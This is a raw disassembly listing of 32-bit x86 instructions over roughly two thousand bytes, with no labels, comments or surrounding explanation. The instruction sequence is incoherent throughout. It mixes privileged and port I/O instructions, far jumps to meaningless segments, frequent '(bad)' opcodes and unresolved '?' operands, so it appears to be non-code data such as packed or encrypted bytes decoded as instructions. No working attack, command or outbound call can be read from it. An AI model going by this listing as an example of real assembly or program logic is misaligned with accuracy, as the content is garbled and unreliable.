  424764:	push   DWORD PTR [eax+0x2aa00c62]
  42476a:	or     eax,0x6ae5634c
  42476f:	nop
  424770:	pop    edi
  424771:	data16 fcom DWORD PTR [edx+0x5]
  424775:	xchg   BYTE PTR [ebx],bl
  424777:	jle    0x4247d2
  424779:	scas   al,BYTE PTR es:[edi]
  42477a:	push   cs
  42477b:	arpl   WORD PTR [eax+esi*1+0xf],bp
  42477f:	adc    dl,ah
  424781:	add    cl,BYTE PTR [ebp+ecx*1-0x48]
  424785:	dec    edx
  424786:	cmp    eax,ecx
  424788:	enter  0xdc1e,0xb0
  42478c:	ja     0x4247ea
  42478e:	cmp    DWORD PTR [ebp+0x4d],esi
  424791:	jb     0x42476e
  424793:	aam    0x34
  424795:	cli    
  424796:	sbb    al,0x2
  424798:	in     eax,0x2a
  42479a:	fsub   DWORD PTR [edx+0xe1cc462]
  4247a0:	sti    
  4247a1:	push   esi
  4247a2:	adc    DWORD PTR [ecx],ecx
  4247a4:	cmp    esp,edx
  4247a6:	scas   al,BYTE PTR es:[edi]
  4247a7:	jecxz  0x424796
  4247a9:	fwait
  4247aa:	das    
  4247ab:	xchg   ebp,eax
  4247ac:	shl    BYTE PTR [esi-0x6635762f],0xb0
  4247b3:	push   ecx
  4247b4:	lods   al,BYTE PTR ds:[esi]
  4247b5:	loopne 0x424741
  4247b7:	jnp    0x424782
  4247b9:	lods   eax,DWORD PTR ds:[esi]
  4247ba:	loop   0x424806
  4247bc:	ret    
  4247bd:	xlat   BYTE PTR ds:[ebx]
  4247be:	fst    QWORD PTR [ebx-0x2fafbbf5]
  4247c4:	test   eax,0xc67c1c6
  4247c9:	push   ss
  4247ca:	pop    edx
  4247cb:	sbb    DWORD PTR cs:[ebx+0x133abc],edi
  4247d2:	sbb    eax,0xe5ad2424
  4247d7:	sub    al,0x9b
  4247d9:	iret   
  4247da:	mov    ebx,0xc748ffa1
  4247df:	mov    esp,0x414429c2
  4247e4:	sysexit 
  4247e6:	sub    ebp,DWORD PTR [esi+0x6e824569]
  4247ec:	outs   dx,BYTE PTR ds:[esi]
  4247ed:	das    
  4247ee:	rcl    cl,1
  4247f0:	imul   dl
  4247f2:	std    
  4247f3:	jmp    0x5eb75ddb
  4247f8:	and    BYTE PTR [ebx+0x57],al
  4247fb:	stos   DWORD PTR es:[edi],eax
  4247fc:	scas   eax,DWORD PTR es:[edi]
  4247fd:	call   0xe34454ff
  424802:	ins    BYTE PTR es:[edi],dx
  424803:	cmp    edi,ebx
  424805:	sahf   
  424806:	mov    bh,0xcb
  424808:	mov    cl,BYTE PTR [eax+eiz*1]
  42480b:	mov    ebp,0x712e772
  424810:	sar    BYTE PTR [esi],cl
  424812:	fild   QWORD PTR [ecx+0x13]
  424815:	xor    ah,BYTE PTR [esi+0x52]
  424818:	mov    ebp,0x53a18d37
  42481d:	sbb    BYTE PTR [ebp+0x1c7620f3],dl
  424823:	imul   ebx,DWORD PTR [edi],0xffffff90
  424826:	outs   dx,DWORD PTR ds:[esi]
  424827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424828:	mov    edx,0x69328505
  42482d:	jp     0x4247cf
  42482f:	in     eax,dx
  424830:	mov    dh,0xa6
  424832:	and    eax,0x86892993
  424837:	xchg   BYTE PTR [esi],cl
  424839:	outs   dx,BYTE PTR ds:[esi]
  42483a:	pop    ds
  42483b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42483c:	pusha  
  42483d:	call   0xc60f3044
  424842:	xchg   edx,eax
  424843:	fdivp  st(6),st
  424845:	aad    0x73
  424847:	in     eax,0x29
  424849:	scas   eax,DWORD PTR es:[edi]
  42484a:	das    
  42484b:	in     eax,dx
  42484c:	xchg   esi,eax
  42484d:	or     BYTE PTR [ebx],ch
  42484f:	adc    cl,0x86
  424852:	scas   eax,DWORD PTR es:[edi]
  424853:	ret    
  424854:	and    esi,DWORD PTR [edi]
  424856:	jl     0x4247dd
  424858:	push   edx
  424859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42485a:	adc    eax,0x5e90f915
  42485f:	ret    0x90c9
  424862:	stc    
  424863:	fimul  WORD PTR [ebx*2+0x1f048073]
  42486a:	sahf   
  42486b:	mov    ah,0x7d
  42486d:	and    cl,BYTE PTR [edi-0x5ec25afc]
  424873:	or     eax,0x7a6cba9
  424878:	mov    ecx,ds
  42487a:	adc    al,0x6d
  42487c:	mov    ch,0xe5
  42487e:	mov    bl,al
  424880:	mov    edi,0xc2ee25b
  424885:	cmp    al,0x33
  424887:	sbb    eax,0xe9cbf0a2
  42488c:	neg    BYTE PTR [edi]
  42488e:	jl     0x42486f
  424890:	mov    edi,0xb857f8ac
  424895:	sbb    bh,bl
  424897:	mov    ebx,0x54f6cf12
  42489c:	mov    ebp,0x83955559
  4248a1:	(bad)  
  4248a3:	jmp    0x42484d
  4248a5:	sar    BYTE PTR [ebx-0x490c5274],1
  4248ab:	pop    edi
  4248ac:	jnp    0x42488b
  4248ae:	neg    DWORD PTR [eax+0x2]
  4248b1:	jl     0x4248d7
  4248b3:	int    0x9a
  4248b5:	sbb    DWORD PTR [ecx],0xa3042d6b
  4248bb:	pushf  
  4248bc:	stos   BYTE PTR es:[edi],al
  4248bd:	test   al,0xbe
  4248bf:	dec    esp
  4248c0:	dec    ecx
  4248c1:	mov    eax,ds:0xbd3e126c
  4248c6:	comiss xmm7,DWORD PTR [esi]
  4248c9:	jmp    0x424873
  4248cb:	call   0xbe9f606b
  4248d0:	adc    al,0x6f
  4248d2:	jp     0x42489c
  4248d4:	iret   
  4248d5:	jb     0x4248c3
  4248d7:	dec    ebp
  4248d8:	retf   0x6888
  4248db:	pop    ecx
  4248dc:	cld    
  4248dd:	adc    edi,DWORD PTR [eax]
  4248df:	mov    edi,0x881cf569
  4248e4:	mov    edx,0x7bba7276
  4248e9:	jmp    0x5d3f:0x53b3a147
  4248f0:	in     eax,dx
  4248f1:	add    al,0x95
  4248f3:	or     BYTE PTR [ebx+0x4a],dh
  4248f6:	jg     0x424888
  4248f8:	shl    BYTE PTR [ebx-0x52],1
  4248fb:	imul   ebp,DWORD PTR [esp+ebp*1-0x35d9d1c9],0xd3b97020
  424906:	mov    ds:0x4be76cd5,eax
  42490b:	or     DWORD PTR [esi],ebx
  42490d:	adc    bl,bh
  42490f:	fld    QWORD PTR [eax-0x23]
  424912:	xchg   ebp,eax
  424913:	fstp   TBYTE PTR [ebx+0x40]
  424916:	fisttp QWORD PTR [eax+0x40]
  424919:	sub    eax,0xc3454783
  42491e:	cwde   
  42491f:	mov    BYTE PTR [edx],ch
  424921:	fisttp QWORD PTR [edi]
  424923:	dec    ecx
  424924:	stc    
  424925:	cli    
  424926:	dec    esi
  424927:	popf   
  424928:	sub    DWORD PTR [edx+0x2e],esp
  42492b:	ins    DWORD PTR es:[edi],dx
  42492c:	inc    ecx
  42492d:	clc    
  42492e:	or     BYTE PTR ds:0x468afeb4,bl
  424934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424935:	dec    esi
  424936:	cmp    bl,BYTE PTR [edi+0x6ec4a08b]
  42493c:	dec    esi
  42493d:	sbb    al,0x62
  42493f:	inc    edi
  424940:	daa    
  424941:	fidivr WORD PTR [eax]
  424943:	xlat   BYTE PTR ds:[ebx]
  424944:	test   BYTE PTR ds:0x73616efe,al
  42494a:	mov    dl,0x70
  42494c:	ficom  DWORD PTR [edi]
  42494e:	inc    BYTE PTR [ecx+ebp*4+0x4f50da7b]
  424955:	leave  
  424956:	jno    0x424981
  424958:	xchg   ebp,eax
  424959:	lea    edx,ds:0xb2dc181d
  42495f:	repnz stos BYTE PTR es:[edi],al
  424961:	loop   0x424944
  424963:	push   ss
  424964:	jl     0x424925
  424966:	aas    
  424967:	fwait
  424968:	cmc    
  424969:	xchg   edx,eax
  42496a:	pop    ds
  42496b:	neg    DWORD PTR [ecx-0x1b]
  42496e:	adc    BYTE PTR [ebx-0x59],al
  424971:	adc    dl,BYTE PTR [eax]
  424973:	outs   dx,BYTE PTR ds:[esi]
  424974:	scas   eax,DWORD PTR es:[edi]
  424975:	dec    esp
  424976:	into   
  424977:	xchg   esi,eax
  424978:	pop    esp
  424979:	mov    al,ds:0x3820680f
  42497e:	push   cs
  42497f:	in     al,dx
  424980:	mov    ds:0x28a58d52,eax
  424985:	sbb    eax,0xf401a017
  42498a:	fimul  WORD PTR [ecx-0x43]
  42498d:	add    edx,DWORD PTR [esi*2-0x69aacb55]
  424994:	cmp    bl,dh
  424996:	imul   esi,DWORD PTR [esi+0x5d],0x59eb3677
  42499d:	bound  edi,QWORD PTR [edx-0x15d7696d]
  4249a3:	int3   
  4249a4:	and    al,0x57
  4249a6:	xor    BYTE PTR [ebx],dh
  4249a8:	icebp  
  4249a9:	jl     0x4249ae
  4249ab:	das    
  4249ac:	es loopne 0x424a29
  4249af:	ins    BYTE PTR es:[edi],dx
  4249b0:	push   0x4f3fb702
  4249b5:	mov    edx,0xdc7373d8
  4249ba:	push   cs
  4249bb:	jb     0x4249bd
  4249bd:	jns    0x424a32
  4249bf:	mov    ah,0x57
  4249c1:	sbb    edi,edx
  4249c3:	adc    ecx,DWORD PTR [ecx-0x49]
  4249c6:	pop    ds
  4249c7:	or     DWORD PTR [ebp-0x13cb249f],0xa070e030
  4249d1:	mov    ecx,DWORD PTR [eax+ebx*4-0x1e]
  4249d5:	push   cs
  4249d6:	sbb    al,0xe2
  4249d8:	add    cl,BYTE PTR [eax]
  4249da:	outs   dx,BYTE PTR ds:[esi]
  4249db:	icebp  
  4249dc:	fnsave [ecx-0x11]
  4249df:	pop    esi
  4249e0:	(bad)  
  4249e2:	push   ebp
  4249e3:	sbb    BYTE PTR [edx+eiz*4-0x1f873aa2],0xa0
  4249eb:	and    eax,0x2f10a67b
  4249f0:	popf   
  4249f1:	adc    DWORD PTR [ebp+0x1],eax
  4249f4:	push   edi
  4249f5:	push   0xffffffed
  4249f7:	sbb    DWORD PTR [eax+0x4c],ebx
  4249fa:	call   0x221bc7ce
  4249ff:	call   0x827d:0xcd805dd4
  424a06:	jbe    0x424a4c
  424a08:	mov    bh,0x95
  424a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a0b:	push   es
  424a0c:	test   DWORD PTR [eax+0x1a],ecx
  424a0f:	pop    ss
  424a10:	in     al,0x76
  424a12:	rcl    BYTE PTR [esi-0x6adac259],0x8b
  424a19:	jae    0x4249f2
  424a1b:	loop   0x4249e5
  424a1d:	sahf   
  424a1e:	popa   
  424a1f:	pop    esi
  424a20:	dec    esi
  424a21:	inc    eax
  424a22:	ret    
  424a23:	rcr    BYTE PTR [ebp+0x63],0x19
  424a27:	das    
  424a28:	scas   al,BYTE PTR es:[edi]
  424a29:	inc    edx
  424a2a:	(bad)  
  424a2b:	in     eax,dx
  424a2c:	fnstenv [edx+0x40e290f8]
  424a32:	lds    edx,FWORD PTR [ebx]
  424a34:	aam    0xe2
  424a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a37:	jp     0x424a3b
  424a39:	pop    ebx
  424a3a:	out    0x59,eax
  424a3c:	mov    ah,0xa2
  424a3e:	mov    edi,0xc97875e
  424a43:	call   0x4ab14c51
  424a48:	and    DWORD PTR [ebx],ebp
  424a4a:	dec    esi
  424a4b:	push   eax
  424a4c:	inc    esi
  424a4d:	test   BYTE PTR [ecx],bl
  424a4f:	loopne 0x4249dd
  424a51:	out    0xd7,al
  424a53:	inc    esp
  424a54:	lahf   
  424a55:	call   0xcb3e8040
  424a5a:	stos   DWORD PTR es:[edi],eax
  424a5b:	mov    al,0x2
  424a5d:	gs pop ax
  424a60:	push   esp
  424a61:	out    dx,eax
  424a62:	hlt    
  424a63:	add    eax,0x7ea9e52d
  424a68:	outs   dx,DWORD PTR ds:[esi]
  424a69:	mov    ecx,0x49bd161e
  424a6e:	je     0x424a74
  424a70:	loop   0x424a9f
  424a72:	fcomp  QWORD PTR [eax-0xc]
  424a75:	push   ebx
  424a76:	cmp    al,0x89
  424a78:	sub    BYTE PTR [ebx+0x289e4230],dl
  424a7e:	scas   eax,DWORD PTR es:[edi]
  424a7f:	int3   
  424a80:	sbb    BYTE PTR [edx-0x204c4658],cl
  424a86:	fisub  DWORD PTR [eax-0x67]
  424a89:	shl    DWORD PTR fs:[ecx-0x79],1
  424a8d:	or     eax,0x873b47f
  424a92:	xor    cl,al
  424a94:	jb     0x424a9a
  424a96:	aad    0xb2
  424a98:	push   edx
  424a99:	push   ss
  424a9a:	test   eax,esp
  424a9c:	enter  0x6630,0x72
  424aa0:	ja     0x424a39
  424aa2:	adc    dh,BYTE PTR [edx-0x106fb738]
  424aa8:	inc    esp
  424aa9:	je     0x424b1c
  424aab:	pusha  
  424aac:	inc    ebx
  424aad:	(bad)  
  424aae:	mov    edi,0x357ebeb7
  424ab3:	xor    BYTE PTR [ebp+0x7746ee24],al
  424ab9:	and    bl,BYTE PTR [edx+esi*1]
  424abc:	in     eax,0x0
  424abe:	lahf   
  424abf:	xchg   esp,eax
  424ac0:	mov    WORD PTR [ebx+0x68],?
  424ac3:	retf   
  424ac4:	(bad)  
  424ac5:	and    DWORD PTR ds:0x1b0d6b07,0xffffff80
  424acc:	jae    0x424ae7
  424ace:	xchg   edi,eax
  424acf:	imul   BYTE PTR [ecx+ebp*4]
  424ad2:	idiv   DWORD PTR [esp+edi*8+0x1e]
  424ad6:	inc    esp
  424ad7:	pushf  
  424ad8:	imul   edx,DWORD PTR [eax+0x3d],0xd2229467
  424adf:	addr16 fld st(3)
  424ae2:	repnz aad 0xf1
  424ae5:	adc    al,0xcc
  424ae7:	dec    esp
  424ae8:	xchg   esi,eax
  424ae9:	ds mov al,0xe1
  424aec:	jmp    0x843c:0xe490caff
  424af3:	popf   
  424af4:	cmp    al,0x3c
  424af6:	fisubr WORD PTR [eax+0x5a]
  424af9:	mov    ecx,DWORD PTR [ecx]
  424afb:	sub    al,0xc9
  424afd:	addr16 mov cl,0x9f
  424b00:	add    edx,DWORD PTR [ebx+0x6d]
  424b03:	inc    esp
  424b04:	or     al,0x37
  424b06:	sbb    esi,edx
  424b08:	push   ebp
  424b09:	repz xchg edi,eax
  424b0b:	cld    
  424b0c:	leave  
  424b0d:	nop
  424b0e:	xchg   ebp,eax
  424b0f:	(bad)  
  424b10:	in     al,dx
  424b11:	adc    esp,DWORD PTR [edx-0x3ba5903a]
  424b17:	ins    DWORD PTR es:[edi],dx
  424b18:	das    
  424b19:	adc    edx,edx
  424b1b:	cmp    al,0xac
  424b1d:	daa    
  424b1e:	sub    al,0xe
  424b20:	int3   
  424b21:	jae    0x424b57
  424b23:	mov    al,ds:0xd9425546
  424b28:	adc    eax,0xe6adac62
  424b2d:	jmp    0x446e533d
  424b32:	jbe    0x424ae1
  424b34:	push   edi
  424b35:	sbb    DWORD PTR [eax-0x70ba6a7b],ecx
  424b3b:	cwd    
  424b3d:	jno    0x424af6
  424b3f:	and    BYTE PTR [eax+0x22],ch
  424b42:	mov    bl,0xe9
  424b44:	jge    0x424b7a
  424b46:	dec    esi
  424b47:	sbb    DWORD PTR [eax],0xffffffbd
  424b4a:	inc    ebx
  424b4b:	jge    0x424b1a
  424b4d:	(bad)
  424b50:	inc    ebp
  424b51:	xchg   DWORD PTR [eax+0x6c507fdc],esi
  424b57:	fdivr  QWORD PTR [ebx+0x23f6972c]
  424b5d:	pusha  
  424b5e:	push   cs
  424b5f:	ret    
  424b60:	fdivrp st(1),st
  424b62:	rcr    DWORD PTR [ecx-0x54],0xfd
  424b66:	xor    BYTE PTR [esi],ah
  424b68:	ss (bad) 
  424b6a:	(bad)  [eax]
  424b6c:	sbb    DWORD PTR [edi],esp
  424b6e:	add    BYTE PTR [eax+0x55],bl
  424b71:	xor    al,0x38
  424b73:	lea    esi,[eax]
  424b75:	int3   
  424b76:	stos   DWORD PTR es:[edi],eax
  424b77:	mov    ah,0x14
  424b79:	mov    dl,0x13
  424b7b:	xor    cl,BYTE PTR [ebp-0xc]
  424b7e:	adc    cl,BYTE PTR [ebp+0x2af54b3]
  424b84:	daa    
  424b85:	inc    esp
  424b86:	jnp    0x424b8e
  424b88:	push   eax
  424b89:	mov    al,ds:0x8d2707d4
  424b8e:	dec    edx
  424b8f:	pop    edi
  424b90:	xlat   BYTE PTR ds:[ebx]
  424b91:	or     DWORD PTR [eax],0xfffffff4
  424b94:	mov    cl,0xe0
  424b96:	pop    edi
  424b97:	loope  0x424b31
  424b99:	jl     0x424bd7
  424b9b:	adc    esi,ebx
  424b9d:	hlt    
  424b9e:	out    dx,eax
  424b9f:	(bad)  
  424ba0:	cmp    eax,0x309f1741
  424ba5:	jge    0x424be9
  424ba7:	loop   0x424b4f
  424ba9:	cli    
  424baa:	lahf   
  424bab:	lods   eax,DWORD PTR ds:[esi]
  424bac:	sbb    eax,0x8b43374c
  424bb1:	push   ebp
  424bb2:	(bad)  
  424bb3:	cmp    dl,BYTE PTR [edi+0x44997e72]
  424bb9:	arpl   WORD PTR [edx+0x5bffc715],cx
  424bbf:	adc    eax,0x80c8756b
  424bc4:	ja     0x424c3f
  424bc6:	push   eax
  424bc7:	and    esi,0x16
  424bca:	in     al,0xbb
  424bcc:	dec    eax
  424bcd:	xor    DWORD PTR [eax-0x72],edi
  424bd0:	sar    BYTE PTR gs:[edi-0x78ea41bb],0x11
  424bd8:	dec    edi
  424bd9:	fsubrp st(1),st
  424bdb:	pop    edi
  424bdc:	add    al,0xef
  424bde:	pop    esp
  424bdf:	cmp    DWORD PTR [ebx+ecx*8-0x18],ebx
  424be3:	mov    edx,0x8102ac3a
  424be8:	pusha  
  424be9:	mov    BYTE PTR [ebp-0x1b],bh
  424bec:	out    dx,eax
  424bed:	fist   WORD PTR [ecx]
  424bef:	das    
  424bf0:	gs ins BYTE PTR es:[edi],dx
  424bf2:	sahf   
  424bf3:	inc    esp
  424bf4:	add    eax,0x2382d711
  424bf9:	fld    TBYTE PTR [edx+0x3d]
  424bfc:	add    esp,edx
  424bfe:	test   ebx,ebp
  424c00:	mov    edx,0x1bb0903b
  424c05:	es aam 0xd0
  424c08:	jae    0x424bcf
  424c0a:	adc    DWORD PTR [esi+0x4c],eax
  424c0d:	fisttp WORD PTR [ebp-0x303261f5]
  424c13:	and    al,0xb9
  424c15:	jge    0x424c25
  424c17:	dec    edi
  424c18:	fs call 0x548d:0xc3f17d26
  424c20:	push   ebx
  424c21:	mov    ch,0xd1
  424c23:	dec    edi
  424c24:	cdq    
  424c25:	add    eax,0xfda54741
  424c2a:	inc    ebx
  424c2b:	rcl    DWORD PTR [ebp+0x417fe4d],cl
  424c31:	add    ebp,DWORD PTR [esi]
  424c33:	test   DWORD PTR [ebp+0x5a52ec2d],eax
  424c39:	mov    ch,0xe9
  424c3b:	jae    0x424c3d
  424c3d:	loop   0x424c39
  424c3f:	mov    BYTE PTR [ebx+esi*2-0x656ba84e],dl
  424c46:	cdq    
  424c47:	xchg   edx,eax
  424c48:	adc    DWORD PTR [ebp+0x62],0x3e
  424c4c:	mov    ecx,0x22c62e26
  424c51:	dec    esp
  424c52:	out    dx,eax
  424c53:	cs loop 0x424cb9
  424c56:	in     eax,0x66
  424c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c59:	pop    eax
  424c5a:	push   es
  424c5b:	call   0x4495:0x38008030
  424c62:	ret    
  424c63:	aad    0xa6
  424c65:	mov    al,ds:0x4eb14688
  424c6a:	xor    eax,0xc9f95055
  424c6f:	outs   dx,BYTE PTR ds:[esi]
  424c70:	sahf   
  424c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c72:	jbe    0x424ce9
  424c74:	mul    esi
  424c76:	out    0xe0,al
  424c78:	add    BYTE PTR [eax-0x64],ch
  424c7b:	pop    esp
  424c7c:	test   al,0x1
  424c7e:	(bad)  
  424c7f:	xor    DWORD PTR [ecx],esi
  424c81:	sub    eax,0xdb81d54b
  424c86:	mov    DWORD PTR [esi+ebx*2-0x4c36c464],edx
  424c8d:	add    esp,edi
  424c8f:	loopne 0x424cfd
  424c91:	mov    ?,ebp
  424c93:	sar    DWORD PTR [ecx+0x2d],1
  424c96:	arpl   dx,di
  424c98:	inc    edx
  424c99:	cmp    DWORD PTR [eax-0x7b],ebp
  424c9c:	lods   eax,DWORD PTR ds:[esi]
  424c9d:	fstp   DWORD PTR [ecx-0x50]
  424ca0:	stos   DWORD PTR es:[edi],eax
  424ca1:	mov    cl,0x74
  424ca3:	fld    st(2)
  424ca5:	xchg   ebp,eax
  424ca6:	lds    esi,FWORD PTR [esi-0x7137320e]
  424cac:	push   ebx
  424cad:	das    
  424cae:	stos   DWORD PTR es:[edi],eax
  424caf:	mov    fs,WORD PTR [edx]
  424cb1:	dec    ecx
  424cb2:	inc    edx
  424cb3:	jno    0x424d27
  424cb5:	mov    ecx,0xc48bb707
  424cba:	cli    
  424cbb:	scas   eax,DWORD PTR es:[edi]
  424cbc:	pop    edx
  424cbd:	push   0x5f
  424cbf:	mov    cs:0xe8f3e152,al
  424cc5:	jmp    0xa813:0xe66ca814
  424ccc:	adc    DWORD PTR [edx],ecx
  424cce:	(bad)  
  424ccf:	call   0x8331:0x94216b63
  424cd6:	sbb    DWORD PTR [edx-0x14fec99f],edx
  424cdc:	das    
  424cdd:	jmp    0x281d:0xb34ca00c
  424ce4:	sub    eax,0x3d97eb5b
  424ce9:	in     al,dx
  424cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ceb:	or     ah,BYTE PTR [ebx+0x9d9d264]
  424cf1:	std    
  424cf2:	(bad)  
  424cf3:	fdiv   DWORD PTR [eax+0x5b]
  424cf6:	jl     0x424cfb
  424cf8:	dec    ecx
  424cf9:	add    eax,0x5eecc125
  424cfe:	inc    esp
  424cff:	adc    eax,0xb1b5e969
  424d04:	fisubr DWORD PTR [eax+0x3f]
  424d07:	int3   
  424d08:	xchg   edx,eax
  424d09:	pop    ss
  424d0a:	fdivrp st(4),st
  424d0c:	lods   eax,DWORD PTR ds:[esi]
  424d0d:	add    esi,esp
  424d0f:	add    BYTE PTR [ebx-0x45],dl
  424d12:	sbb    al,0xc1
  424d14:	scas   al,BYTE PTR es:[edi]
  424d15:	sub    al,0xe9
  424d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d18:	dec    esp
  424d19:	mov    ah,0x24
  424d1b:	call   0x57eb0ed2
  424d20:	cmp    edx,DWORD PTR [ecx]
  424d22:	addr16 xor eax,0xdcea13b4
  424d28:	imul   BYTE PTR [ebx]
  424d2a:	scas   eax,DWORD PTR es:[edi]
  424d2b:	out    dx,eax
  424d2c:	add    esi,esi
  424d2e:	inc    ecx
  424d2f:	stc    
  424d30:	ficom  WORD PTR ds:0x80e17df8
  424d36:	shl    BYTE PTR [edx+0x20866c86],0x90
  424d3d:	mov    ds:0xc94654a5,eax
  424d42:	cld    
  424d43:	cli    
  424d44:	arpl   WORD PTR ds:0xe0dbe552,si
  424d4a:	iret   
  424d4b:	or     ah,BYTE PTR [ecx+0x1d]
  424d4e:	(bad)  
  424d50:	push   0x57e0d6d1
  424d55:	jo     0x424d73
  424d57:	mov    al,0x90
  424d59:	retf   0xb913
  424d5c:	adc    al,BYTE PTR [ecx-0x2219a752]
  424d62:	(bad)  
  424d63:	mov    eax,0xe61b0ece
  424d68:	dec    DWORD PTR [eax+esi*1-0x31d3c4ba]
  424d6f:	mov    eax,ds:0x7087e5ee
  424d74:	xchg   esp,eax
  424d75:	fwait
  424d76:	xchg   ebp,eax
  424d77:	jl     0x424d52
  424d79:	jmp    0x9e67b3f9
  424d7e:	scas   eax,DWORD PTR es:[edi]
  424d7f:	inc    esi
  424d80:	les    ecx,FWORD PTR [edi+edx*1-0x723806a8]
  424d87:	in     eax,dx
  424d88:	jns    0x424d2f
  424d8a:	xchg   edx,eax
  424d8b:	and    DWORD PTR [edx],0xffffff98
  424d8e:	sbb    dh,al
  424d90:	xor    DWORD PTR ds:0xcfaf6171,edx
  424d96:	inc    ebp
  424d97:	mov    dh,0xfe
  424d99:	and    eax,DWORD PTR [esi]
  424d9b:	ret    0x7033
  424d9e:	or     BYTE PTR [edx+0x3e1e43ae],ah
  424da4:	mov    ah,0x87
  424da6:	add    DWORD PTR [ecx],ebx
  424da8:	cmp    bh,bl
  424daa:	mov    ch,0x61
  424dac:	sub    DWORD PTR [esi+edx*1-0x1b],ecx
  424db0:	xor    edx,esp
  424db2:	mov    bl,ah
  424db4:	sub    BYTE PTR ds:0x9ef619f1,ah
  424dba:	into   
  424dbb:	jmp    0x23f6649d
  424dc0:	or     edi,DWORD PTR [esi+edi*8]
  424dc3:	push   eax
  424dc4:	test   DWORD PTR [eax],esp
  424dc6:	dec    eax
  424dc7:	in     eax,dx
  424dc8:	push   es
  424dc9:	push   cs
  424dca:	add    DWORD PTR [esi-0x25],0xffffffaf
  424dce:	data16 mov cl,0x2b
  424dd1:	pop    ebx
  424dd2:	push   edx
  424dd3:	(bad)  
  424dd4:	in     eax,dx
  424dd5:	dec    eax
  424dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dd7:	test   DWORD PTR [eax-0x2d],ebx
  424dda:	mov    ebp,0x89d32cd6
  424ddf:	fidivr DWORD PTR [esi+0x2d]
  424de2:	shr    DWORD PTR [ebp+0x5],cl
  424de5:	jo     0x424df1
  424de7:	ror    DWORD PTR [eax+0x32],0xb1
  424deb:	pop    edx
  424dec:	call   0x60de:0xdcec1c5f
  424df3:	lahf   
  424df4:	add    BYTE PTR [edi],bl
  424df6:	in     eax,0x25
  424df8:	sahf   
  424df9:	and    edi,edi
  424dfb:	xchg   DWORD PTR [edi],ebx
  424dfd:	(bad)  [edx-0x1]
  424e00:	aam    0x7e
  424e02:	mov    ds:0x65788967,eax
  424e07:	pop    ss
  424e08:	ficom  WORD PTR gs:[eax-0x5705070f]
  424e0f:	mov    ebx,0x533710a4
  424e14:	pop    ebx
  424e15:	jge    0x424e13
  424e17:	in     al,0xaf
  424e19:	jmp    0x1f3:0x9e5890d0
  424e20:	adc    eax,0xaa111339
  424e25:	hlt    
  424e26:	jge    0x424e73
  424e28:	fdivr  QWORD PTR [esi-0x220a4959]
  424e2e:	popa   
  424e2f:	loopne 0x424e0c
  424e31:	in     eax,dx
  424e32:	cmp    al,0x50
  424e34:	sub    BYTE PTR [edx],0x91
  424e37:	xchg   ebx,eax
  424e38:	neg    DWORD PTR [edx-0x3699baa7]
  424e3e:	or     DWORD PTR [ecx-0x4],0x47fa911
  424e45:	fisttp WORD PTR [eax+ebp*1]
  424e48:	inc    ebp
  424e49:	inc    ecx
  424e4a:	fst    DWORD PTR [ebx+0xcfc22ef]
  424e50:	push   ds
  424e51:	mov    ecx,0x1dc0f3c4
  424e56:	js     0x424e1a
  424e58:	xchg   ecx,eax
  424e59:	jle    0x424e3a
  424e5b:	xchg   BYTE PTR [edx+0x3f1422cd],bl
  424e61:	sbb    al,0xd4
  424e63:	push   0x6d
  424e65:	scas   eax,DWORD PTR es:[edi]
  424e66:	dec    ax
  424e68:	sbb    DWORD PTR [ebx-0x3ce3066f],ecx
  424e6e:	dec    BYTE PTR [ebx+ecx*8]
  424e71:	ror    DWORD PTR [edi+0x7b898b1e],1
  424e77:	dec    eax
  424e78:	add    esp,DWORD PTR [ecx-0x61]
  424e7b:	dec    esp
  424e7c:	nop
  424e7d:	mov    WORD PTR [ebp-0x72],?
  424e80:	and    DWORD PTR [esi+0x53d2080e],0x25
  424e87:	push   edi
  424e88:	test   al,0x27
  424e8a:	das    
  424e8b:	mov    ebx,0xa90be43c
  424e90:	test   eax,0x8d7eb18d
  424e95:	out    0x81,eax
  424e97:	mov    edi,0x1a0ac8a5
  424e9c:	xchg   BYTE PTR [esi-0x33639686],dl
  424ea2:	imul   esp,DWORD PTR [edx+0x64d43e02],0x3d1ec418
  424eac:	fisttp WORD PTR [ecx-0x3efdf58e]
  424eb2:	ror    BYTE PTR [ebx+ebp*4-0x21],cl
  424eb6:	(bad)  
  424eb7:	shl    BYTE PTR [edx],cl
  424eb9:	into   
  424eba:	push   0x62
  424ebc:	jbe    0x424ee3
  424ebe:	(bad)  
  424ebf:	jl     0x424f39
  424ec1:	and    al,dh
  424ec3:	push   0xfbffddca
  424ec8:	dec    edx
  424ec9:	or     ch,BYTE PTR [edx]
  424ecb:	add    bl,BYTE PTR [esi+0x7accc729]
  424ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ed2:	int3   
  424ed3:	push   ecx
  424ed4:	test   DWORD PTR [eax-0x30],ecx
  424ed7:	push   es
  424ed8:	sub    al,0x74
  424eda:	mov    esp,0x5752e93a
  424edf:	fild   QWORD PTR [edx]
  424ee1:	pop    ss
  424ee2:	inc    ecx
  424ee3:	ret    0xc1e3
  424ee6:	int    0xfc
  424ee8:	out    0x89,al
  424eea:	sbb    BYTE PTR [eax],bl
  424eec:	and    DWORD PTR [eax],edi
  424eee:	loop   0x424edb
  424ef0:	out    dx,eax
  424ef1:	int    0xad
  424ef3:	push   ebp
  424ef4:	test   ch,bh
  424ef6:	mov    bl,al
  424ef8:	frstor [ecx+0x15f7f9a4]
  424efe:	dec    esi
  424eff:	xchg   edx,eax
  424f00:	sub    cl,BYTE PTR ds:0x5d93e69
  424f06:	inc    edi
  424f07:	pop    ecx
  424f08:	sahf   
  424f09:	sti    
  424f0a:	mov    es,WORD PTR [ebx]
  424f0c:	(bad)  
  424f0d:	jle    0x424f3a
  424f0f:	iret   
  424f10:	xchg   esi,eax
  424f11:	mov    ebx,0x116df1e7
  424f16:	stc    
  424f17:	in     eax,dx
  424f18:	mov    bh,0x37
  424f1a:	cmc    
  424f1b:	xor    bh,bl
  424f1d:	add    al,0xea
